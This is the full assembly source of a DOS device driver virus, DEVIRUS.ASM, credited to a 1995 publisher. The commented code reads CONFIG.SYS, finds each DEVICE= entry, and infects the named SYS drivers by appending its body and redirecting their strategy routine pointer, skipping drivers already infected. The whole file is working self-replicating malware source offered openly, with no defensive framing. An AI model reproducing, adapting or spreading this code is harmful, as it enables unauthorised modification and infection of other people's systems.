;DEVIRUS.ASM is a simple device driver virus. When executed it infects all of
;the SYS files in CONFIG.SYS.

;(C) 1995 American Eagle Publications, Inc., All rights reserved.

.model tiny
.code

        ORG     0

HEADER:
        dd      -1              ;Link to next device driver
        dw      0C840H          ;Device attribute word
STRTN   dw      OFFSET VIRUS    ;Pointer to strategy routine
INTRTN  dw      OFFSET INTR     ;Pointer to interrupt routine
        db      'DEVIRUS '       ;Device name

RHPTR   dd      ?               ;pointer to request header, filled in by DOS

;This is the strategy routine. Typically it just takes the value passed to it
;in es:bx and stores it at RHPTR for use by the INTR procedure. This value is
;the pointer to the request header, which the device uses to determine what is
;being asked of it.
STRAT:
        mov     WORD PTR cs:[RHPTR],bx
        mov     WORD PTR cs:[RHPTR+2],es
        retf

;This is the interrupt routine. It's called by DOS to tell the device driver
;to do something. Typical calls include reading or writing to a device,
;opening it, closing it, etc.
INTR:
        push    bx
        push    si
        push    di
        push    ds
        push    es
        push    cs
        pop     ds
        les     di,[RHPTR]      ;es:di points to request header
        mov     al,es:[di+2]    ;get command number

        or      al,al           ;command number 0? (Initialize device)
        jnz     INTR1           ;nope, handle other commands
        call    INIT            ;yes, go initialize device
        jmp     INTRX           ;and exit INTR routine

INTR1:  call    NOT_IMPLEMENTED ;all other commands not implemented

INTRX:  pop     es
        pop     ds
        pop     di
        pop     si
        pop     bx
        retf

;Device initialization routine, Function 0. This just displays HELLO_MSG using
;BIOS video and then exits.
INIT:
        mov     si,OFFSET HELLO_MSG
INITLP: lodsb
        or      al,al
        jz      INITX
        mov     ah,0EH
        int     10H
        jmp     INITLP
INITX:  mov     WORD PTR es:[di+14],OFFSET END_DRIVER
        mov     WORD PTR es:[di+16],cs  ;indicate end of driver here
        xor     ax,ax           ;zero ax to indicate success and exit
        ret

HELLO_MSG       DB      'You''ve just released the DEVICE VIRUS!',0DH,0AH,7,0

;This routine is used for all non-implemented functions.
NOT_IMPLEMENTED:
        xor     ax,ax           ;zero ax to indicate success and exit
        ret

END_DRIVER:                     ;label to identify end of device driver

;This code is the device driver virus itself. It opens CONFIG.SYS and
;scans it for DEVICE= statements. It takes the name after each DEVICE=
;statement and tries to infect it. When it's all done, it passes control
;back to the STRAT routine, which is what it took over to begin with.
;The virus preserves all registers.
VIRUS:
        push    ax
        push    bx
        push    cx
        push    dx
        push    si
        push    di
        push    bp
        push    ds
        push    es
        push    cs
        pop     ds
        push    cs
        pop     es
        call    VIRUS_ADDR
VIRUS_ADDR:
        pop     di
        sub     di,OFFSET VIRUS_ADDR
        mov     ax,3D00H        ;open CONFIG.SYS in read mode
        lea     dx,[di+OFFSET CSYS]
        int     21H
        mov     bx,ax
CSL:    call    READ_LINE       ;read one line of CONFIG.SYS
        jc      CCS             ;done? if so, close CONFIG.SYS
        call    IS_DEVICE       ;check for device statement
        jnz     CSL             ;nope, go do another line
        call    INFECT_FILE     ;yes, infect the file if it needs it
        jmp     CSL

CCS:    mov     ah,3EH          ;close CONFIG.SYS file
        int     21H

VIREX:  mov     ax,[di+STRJMP]  ;take virus out of the STRAT loop!
        mov     WORD PTR [STRTN],ax
        pop     es
        pop     ds
        pop     bp
        pop     di
        pop     si
        pop     dx
        pop     cx
        pop     bx
        pop     ax
        jmp     cs:[STRTN]      ;and go to STRAT routine


;This routine reads one line from the text file whose handle is in bx and
;puts the data read in LINEBUF as an asciiz string. It is used for reading
;the CONFIG.SYS file.
READ_LINE:
        lea     dx,[di + OFFSET LINEBUF]
RLL:    mov     cx,1            ;read one byte from CONFIG.SYS
        mov     ah,3FH
        int     21H
        or      al,al
        jz      RLRC
        mov     si,dx
        inc     dx
        cmp     BYTE PTR [si],0DH       ;end of line (carriage return)?
        jnz     RLL
        mov     BYTE PTR [si],0         ;null terminate the string
        mov     cx,1                    ;read line feed
        mov     ah,3FH
        int     21H
        or      al,al
        jnz     RLR
RLRC:   stc
RLR:    ret


;This routine checks the line in LINEBUF for a DEVICE= statement. It returns
;with z set if it finds one, and it returns the name of the device driver
;as an asciiz string in the LINEBUF buffer.
IS_DEVICE:
        lea     si,[di+OFFSET LINEBUF]  ;look for "DEVICE="
        lodsw                           ;get 2 bytes
        or      ax,2020H                ;make it lower case
        cmp     ax,'ed'
        jnz     IDR
        lodsw
        or      ax,2020H
        cmp     ax,'iv'
        jnz     IDR
        lodsw
        or      ax,2020H
        cmp     ax,'ec'
        jnz     IDR
ID1:    lodsb                           ;ok, we found "device" at start of line
        cmp     al,' '                  ;kill possible spaces before '='
        jz      ID1
        cmp     al,'='                  ;not a space, is it '='?
        jnz     IDR                     ;no, just exit
ID2:    lodsb                           ;strip spaces after =
        cmp     al,' '
        jz      ID2                     ;loop until they're all gone
        dec     si                      ;adjust pointer
        mov     bp,di
        lea     di,[di+OFFSET LINEBUF]  ;ok, it is a device
IDL:    lodsb                           ;move file name up to LINEBUF
        cmp     al,20H                  ;turn space to zero
        jnz     ID3
        xor     al,al
ID3:    stosb
        or      al,al
        jnz     IDL
        mov     di,bp
IDR:    ret                            ;return with flags set right


;This routine checks the SYS file named in the LINEBUF buffer to see if it's
;infected, and it infects it if not infected.
INFECT_FILE:
        push    bx

        lea     dx,[di+OFFSET LINEBUF]  ;open the file at LINEBUF
        mov     ax,3D02H
        int     21H
        mov     bx,ax

        mov     ah,3FH                  ;read 1st 10 bytes of device driver
        lea     dx,[di+OFFSET FILEBUF]  ;into FILEBUF
        mov     cx,10
        int     21H

        cmp     [di+OFFSET FILEBUF],'ZM';watch for EXE-type drivers
        je      IFCLOSE                 ;don't infect them at all

        mov     dx,WORD PTR [di+OFFSET FILEBUF+6] ;get offset of STRAT routine
        xor     cx,cx
        mov     ax,4200H                ;and move there in file
        int     21H

        mov     cx,10                   ;read 10 bytes of STRAT routine
        mov     ah,3FH
        lea     dx,[di+OFFSET FILEBUF+10]
        int     21H

        mov     bp,di
        mov     si,di
        add     si,OFFSET FILEBUF+10    ;is file infected?
        add     di,OFFSET VIRUS         ;compare 10 bytes of STRAT routine
        mov     cx,10                   ;with the virus
        repz    cmpsb                   ;to see if they're the same
        mov     di,bp
        jz      IFCLOSE                 ;if infected, exit now

        mov     ax,4202H                ;seek to end of file
        xor     cx,cx
        xor     dx,dx
        int     21H
        push    ax                      ;save end of file address

        mov     ax,[di+OFFSET STRJMP]          ;save current STRJMP
        push    ax
        mov     ax,WORD PTR [di+OFFSET FILEBUF+6] ;and set up STRJMP for new infection
        mov     [di+OFFSET STRJMP],ax

        mov     ah,40H                  ;write virus to end of file
        mov     cx,OFFSET END_VIRUS - OFFSET VIRUS
        lea     dx,[di+OFFSET VIRUS]
        int     21H

        pop     ax                      ;restore STRJMP for this instance of
        mov     [di+OFFSET STRJMP],ax             ;the virus

        mov     ax,4200H                ;seek to STRAT routine address
        xor     cx,cx                   ;at offset 6 from start of file
        mov     dx,6
        int     21H

        pop     ax                      ;restore original end of file
        mov     WORD PTR [di+OFFSET FILEBUF],ax   ;save it here for new STRAT entry point
        mov     ah,40H                  ;now write new STRAT entry point
        lea     dx,[di+OFFSET FILEBUF]       ;to file being infected
        mov     cx,2
        int     21H

IFCLOSE:mov     ah,3EH                  ;close the file
        int     21H
        pop     bx                      ;and exit
        ret

STRJMP  DW      OFFSET STRAT
CSYS    DB      '\CONFIG.SYS',0
LINEBUF DB      129 dup (0)
FILEBUF DB      20 dup (0)

END_VIRUS:

        END     STRAT
